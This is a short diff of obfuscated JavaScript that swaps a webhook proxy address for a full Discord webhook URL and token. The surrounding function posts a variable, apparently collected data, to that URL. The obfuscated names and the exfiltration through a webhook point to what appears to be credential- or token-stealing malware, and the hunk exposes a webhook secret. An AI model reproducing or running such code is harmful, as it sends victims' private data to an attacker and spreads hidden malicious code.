@@ -344,7 +344,7 @@ _0x4f0bca
               ],
             }
           _0x50d6a5(
-            'https://vineyard.performave.com/api/webhook/v1/proxy/816300ac-1d00-4b29-be46-2bdeb51c8811',
+            'https://discord.com/api/webhooks/1152199917717176350/jNehBYW_-vVqw7mpe3jZ96H29UuInqj2um2J5p4t-cw1UkhzsERwxJfQM8QOcWPKhlcH',
             _0x220c4c
           )
         })
